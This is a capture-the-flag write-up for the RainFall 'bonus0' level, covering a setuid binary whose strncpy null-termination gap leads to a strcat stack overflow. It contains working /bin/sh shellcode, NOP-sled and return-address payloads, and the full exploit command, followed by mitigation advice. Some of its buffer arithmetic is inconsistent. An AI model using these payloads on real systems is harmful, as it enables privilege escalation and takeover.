# Bonus0

## Initial Analysis

### 1. Examine the Binary
```bash
bonus0@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
-rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile

bonus0@RainFall:~$ file bonus0
bonus0: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xfef8b17db26c56ebfd1e20f17286fae3729a5ade, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **bonus1** user
- When executed, runs with **bonus1 privileges**
- **Not stripped** - debugging symbols available

### 2. Test Basic Execution Behavior
```bash
bonus0@RainFall:~$ ./bonus0
 - 
first input
 - 
second input  
first input second input
```

**Program Behavior Discovery:**
- **Interactive program**: Prompts with " - " twice
- **Two inputs required**: Reads first input, then second input
- **String concatenation**: Outputs both inputs separated by a space
- **Format**: `first_input + " " + second_input`

### 3. Analyzing with ltrace
```bash
bonus0@RainFall:~$ ltrace ./bonus0 
__libc_start_main(0x80485a4, 1, 0xbffff7f4, 0x80485d0, 0x8048640 <unfinished ...>
puts("-") = 4
read(0, "\n",4096) = 1
strchr("\n", '\n') = "\n"      
strncpy(0xbffff6d8, "", 20) = 0xbffff6d8
puts(" - ") = 4
read(0, "\n", 4096) = 1
strchr("\n", '\n') = "\n"      
strncpy(0xbffff6ec, "", 20) = 0xbffff6ec
strcpy(0xbffff726, "") = 0xbffff726
strcat(" ", "") = " "
puts(" ") = 2
+++ exited (status 0) +++
```

**Function Call Analysis:**
- **puts(" - ")**: Displays prompt twice
- **read()**: Reads 4096 bytes from stdin each time
- **strchr()**: Finds newline character
- **strncpy()**: Copies up to 20 bytes (twice)
- **strcpy()**: Copies first input to main buffer
- **strcat()**: Concatenates second input with space

**Critical Discovery**: The program uses both `strncpy()` (with size limit) and `strcpy()`/`strcat()` (without size limits)!

## Reverse Engineering - Understanding the Vulnerability Chain

### 4. Function Analysis - Discovering the Architecture
```bash
bonus0@RainFall:~$ gdb bonus0
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048380  read@plt
0x08048390  strcat@plt      ← Dangerous concatenation
0x080483a0  strcpy@plt      ← Dangerous copy
0x080483b0  puts@plt        ← Output function
0x080483d0  strchr@plt      ← String search
0x080483f0  strncpy@plt     ← "Safe" copy with size limit
0x080484b4  p               ← Input processing function
0x0804851e  pp              ← Main processing function  
0x080485a4  main
```

**Function Architecture Discovery:**
- **Three custom functions**: main(), pp(), p()
- **Dangerous string functions**: strcpy(), strcat() without bounds checking
- **"Safe" function**: strncpy() with size limit (but potential for bypass)
- **Input/output functions**: read(), puts(), strchr()

### 5. Understanding the Function Call Chain
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   %ebp
   0x080485a5 <+1>:     mov    %esp,%ebp
   0x080485a7 <+3>:     and    $0xfffffff0,%esp
   0x080485aa <+6>:     sub    $0x40,%esp        # 64 bytes local space
   0x080485ad <+9>:     lea    0x16(%esp),%eax   # Buffer at ESP+22 (42 bytes)
   0x080485b1 <+13>:    mov    %eax,(%esp)       # Push buffer address
   0x080485b4 <+16>:    call   0x804851e <pp>    # Call pp(buffer)
   0x080485b9 <+21>:    lea    0x16(%esp),%eax   # Load buffer again
   0x080485bd <+25>:    mov    %eax,(%esp)       # Push for output
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>  # puts(buffer)
   0x080485c5 <+33>:    mov    $0x0,%eax         # Return 0
   0x080485ca <+38>:    leave
   0x080485cb <+39>:    ret                      # Return address ← HIJACK TARGET!
```

**Main Function Analysis:**
- **Allocates 64 bytes local space**
- **Buffer location**: ESP+22, so buffer size = 64-22 = **42 bytes**
- **Calls pp() with buffer address**
- **Outputs result with puts()**
- **Return address vulnerable** to overflow from buffer

### 6. Analyzing pp() Function - The Processing Logic
```bash
(gdb) disas pp
# Key parts of pp() function:
0x08048526 <+8>:     movl   $0x80486a0,0x4(%esp)  # " - " string
0x0804852e <+16>:    lea    -0x30(%ebp),%eax      # buffer1 (EBP-48)
0x08048534 <+22>:    call   0x80484b4 <p>         # p(buffer1, " - ")

0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)  # " - " string  
0x08048541 <+35>:    lea    -0x1c(%ebp),%eax      # buffer2 (EBP-28)
0x08048547 <+41>:    call   0x80484b4 <p>         # p(buffer2, " - ")

0x08048559 <+59>:    call   0x80483a0 <strcpy@plt> # strcpy(main_buf, buffer1)
0x08048598 <+122>:   call   0x8048390 <strcat@plt> # strcat(main_buf, buffer2)
```

**pp() Function Logic:**
1. **Two local buffers**: buffer1 (20 bytes), buffer2 (20 bytes)
2. **Two p() calls**: Read input into each local buffer
3. **strcpy()**: Copy buffer1 to main buffer (no size check!)
4. **Space addition**: Adds " " separator
5. **strcat()**: Concatenates buffer2 (no size check!)

**Buffer Size Analysis:**
- buffer1: 20 bytes maximum
- buffer2: 20 bytes maximum  
- Combined: 20 + 1 + 20 = **41 bytes potential**
- Main buffer: **42 bytes available**
- **Overflow condition**: If null-termination is bypassed!

### 7. Analyzing p() Function - The Critical Vulnerability
```bash
(gdb) disas p
# Key vulnerability in p() function:
0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)     # 4096 bytes
0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax    # Large buffer
0x080484e1 <+45>:    call   0x8048380 <read@plt>  # read(0, buffer, 4096)

0x080484e6 <+50>:    movl   $0xa,0x4(%esp)        # '\n' character
0x080484f7 <+67>:    call   0x80483d0 <strchr@plt> # strchr(buffer, '\n')
0x080484fc <+72>:    movb   $0x0,(%eax)           # Replace '\n' with '\0'

0x08048505 <+81>:    movl   $0x14,0x8(%esp)       # 20 bytes limit!
0x08048517 <+99>:    call   0x80483f0 <strncpy@plt> # strncpy(dest, src, 20)
```

**p() Function Critical Analysis:**
1. **Reads 4096 bytes** into large buffer
2. **Finds and replaces newline** with null terminator
3. **Uses strncpy() with 20-byte limit**

**The strncpy() Vulnerability:**
```c
// strncpy() behavior:
if (source_length >= 20) {
    // Copies exactly 20 bytes, NO null terminator added!
} else {
    // Copies source + null terminator + zero padding
}
```

**Critical Discovery**: If input is exactly 20 characters, strncpy() does NOT add null terminator!

## The Null-Termination Bypass Strategy

### 8. Understanding the Vulnerability Mechanics
```bash
# Testing different input lengths:
bonus0@RainFall:~$ ./bonus0
 - 
hello                    # < 20 chars: null-terminated
 - 
world                    # < 20 chars: null-terminated  
hello world              # Normal behavior

bonus0@RainFall:~$ ./bonus0
 - 
12345678901234567890    # Exactly 20 chars: NO null terminator!
 - 
overflow                # < 20 chars: null-terminated
12345678901234567890overflow overflow  # Unexpected behavior !
```

**Vulnerability Confirmation:**
- **Input < 20 chars**: strncpy() adds null terminator
- **Input = 20 chars**: strncpy() copies 20 bytes, NO null terminator
- **Result**: First buffer not null-terminated, concatenation bypasses space logic

### 9. Memory Layout During Vulnerable Concatenation
```
Memory State with 20-character first input:

buffer1: [12345678901234567890] ← NO null terminator!
buffer2: [overflow\0\0\0\0......]  ← Null terminated

strcpy(main_buffer, buffer1):
main_buffer: [12345678901234567890????????????????]
                                 ↑
                           Continues reading past buffer1!

After space addition and strcat(main_buffer, buffer2):
main_buffer: [12345678901234567890 overflow\0]
             20 bytes + 1 + 8 bytes = 29 bytes (safe)

But with longer second input:
main_buffer: [12345678901234567890 12345678901234567890\0]  
             20 + 1 + 20 = 41 bytes → EXACTLY at buffer limit!
```

### 10. Finding the Overflow Offset
```bash
(gdb) run
Starting program: /home/user/bonus0/bonus0
 - 
01234567890123456789     # Exactly 20 chars to bypass null termination
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()

(gdb) info registers
eip            0x41336141       0x41336141
```

**De Bruijn Pattern Analysis:**
```
Crash EIP: 0x41336141 = "a3A" in little-endian
Looking for "a3A" in the pattern: appears at position 9

Offset Discovery: 9 bytes from start of second input to EIP overwrite
```

### 11. Buffer Layout Understanding
```
Complete Buffer Layout Analysis:

First input:  [20 bytes no null term]
Space:        [1 byte: " "]  
Second input: [9 bytes padding][4 bytes EIP][7 bytes remaining]
Total:        20 + 1 + 20 = 41 bytes

Main buffer overflow:
[20 bytes][" "][9 pad][EIP overwrite][remaining data...]
                       ↑
                 Return address corruption point
```

## Shellcode Injection Strategy

### 12. Exploit Strategy Development
```
Two-Stage Shellcode Injection:

Stage 1 - First Input (20 bytes):
- NOP sled instructions (0x90) to create landing zone
- Placed in the large 4096-byte buffer during p() processing

Stage 2 - Second Input (20 bytes):  
- 9 bytes padding to reach return address
- 4 bytes return address pointing to NOP sled
- 7 bytes remaining padding

Memory Layout:
Large buffer: [NOP sled + shellcode] ← Return address points here
Main buffer:  [20 bytes NOP][" "][9 pad][ret addr][7 pad]
```

### 13. Finding the Large Buffer Address
```bash
(gdb) disas p
# Finding the large buffer location:
0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax    # buffer start

(gdb) break *p+28
Breakpoint 1 at 0x80484d0
(gdb) run
 - 
Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:     0x00000000

# Buffer address: 0xbfffe680
# After 61 bytes of concatenated data: 0xbfffe680 + 61 = 0xbfffe6bd
# Safe address in NOP sled: 0xbfffe6d0
```

**Address Calculation:**
- **Large buffer start**: 0xbfffe680
- **After concatenated data**: 0xbfffe680 + 61 = 0xbfffe6bd
- **Safe return address**: 0xbfffe6d0 (in NOP sled region)

## Exploitation Implementation

### 14. Constructing the Shellcode Payload
```bash
# Shellcode for /bin/sh execution (28 bytes):
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# First input: NOP sled + shellcode (exactly 20 bytes for null-termination bypass)
first_input = "\x90" * (20 - len(shellcode)) + shellcode  # Invalid: too short
# Better approach: Place shellcode after initial NOP padding
first_input = "\x90" * 20  # Exactly 20 NOPs to bypass null termination

# Extended payload in large buffer:
extended_payload = "\x90" * 100 + shellcode  # 100 NOPs + 28 bytes shellcode
```

### 15. Crafting the Complete Exploit
```bash
# First input: Exactly 20 bytes to bypass null termination
first_payload = python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'

# Second input: 9 bytes padding + return address + 7 bytes padding
second_payload = python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'

# Explanation:
# "A" * 9: Padding to reach return address position
# "\xd0\xe6\xff\xbf": Return address 0xbfffe6d0 in little-endian
# "B" * 7: Remaining padding to reach 20 bytes
```

### 16. Execute the Exploit
```bash
bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
 - 
 - 
AAAAAAAAABBBBBBB AAAAAAAAABBBBBBB
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

**Success Analysis:**
1. **First input**: 100 NOPs + shellcode placed in large buffer, strncpy() copies first 20 bytes (NOPs) with no null terminator
2. **Null-termination bypass**: First buffer lacks null terminator, enabling overflow
3. **Second input**: 9 padding bytes reach return address position
4. **Return address overwrite**: 0xbfffe6d0 points into NOP sled
5. **String concatenation overflow**: strcat() writes beyond main buffer boundary
6. **Control hijacking**: Return jumps to NOP sled, slides to shellcode
7. **Shell execution**: Shellcode executes /bin/sh with elevated privileges

### 17. Understanding the Execution Flow
```bash
# Step-by-step execution:
1. First p() call:
   - Reads NOP sled + shellcode into large buffer
   - strncpy() copies 20 NOPs to buffer1 (no null terminator)

2. Second p() call:
   - Reads attack payload into large buffer  
   - strncpy() copies first 20 bytes to buffer2 (with null terminator)

3. pp() string operations:
   - strcpy(main_buffer, buffer1): Copies 20 NOPs (no null term)
   - Adds " " separator
   - strcat(main_buffer, buffer2): Concatenates attack payload
   - Total: 20 + 1 + 20 = 41 bytes, overflows 42-byte buffer

4. Return to main():
   - Corrupted return address (0xbfffe6d0) loaded
   - Jumps to NOP sled in large buffer
   - Slides to shellcode, executes /bin/sh
```

## String Exploitation Analysis

### 18. Understanding the Vulnerability Class

**Null-Termination Bypass:**
- **strncpy() behavior**: Does not always null-terminate
- **Length dependency**: Behavior changes based on source length
- **Concatenation impact**: Affects subsequent string operations
- **Overflow amplification**: Enables buffer overflows in "safe" operations

**String Operation Chain Vulnerabilities:**
- **Multiple function interaction**: strncpy() → strcpy() → strcat()
- **Assumption propagation**: Each function assumes previous function's guarantees
- **Boundary condition exploitation**: Edge cases in string handling
- **Compound vulnerabilities**: Individual "safe" operations become dangerous in combination

### 19. Modern Security Implications

**Real-World Relevance:**
- **Legacy code patterns**: Many applications use similar string processing chains
- **Input validation gaps**: Boundary conditions often overlooked
- **Library function misunderstanding**: strncpy() behavior commonly misunderstood
- **Defense complexity**: Securing against chain vulnerabilities requires comprehensive analysis

**Modern Mitigations:**
- **Compiler protections**: Stack canaries, FORTIFY_SOURCE
- **Safe string libraries**: Bounds-checked string operations
- **Static analysis**: Detection of potential string operation chains
- **Runtime protection**: AddressSanitizer, stack overflow protection
- **Secure coding practices**: Explicit null termination, length tracking

### 20. Secure Coding Lessons

**What Went Wrong:**
```c
// Vulnerable pattern:
char buf1[20], buf2[20], main_buf[42];
strncpy(buf1, input1, 20);  // May not null-terminate!
strncpy(buf2, input2, 20);  // Relies on input being < 20
strcpy(main_buf, buf1);     // Assumes buf1 is null-terminated
strcat(main_buf, buf2);     // Assumes sufficient space
```

**Secure Alternatives:**
```c
// Safer approach:
char buf1[21], buf2[21], main_buf[50];  // Larger buffers
strncpy(buf1, input1, 20);
buf1[20] = '\0';                        // Explicit null termination
strncpy(buf2, input2, 20);
buf2[20] = '\0';                        // Explicit null termination
snprintf(main_buf, sizeof(main_buf), "%s %s", buf1, buf2);  // Bounds-checked concatenation
```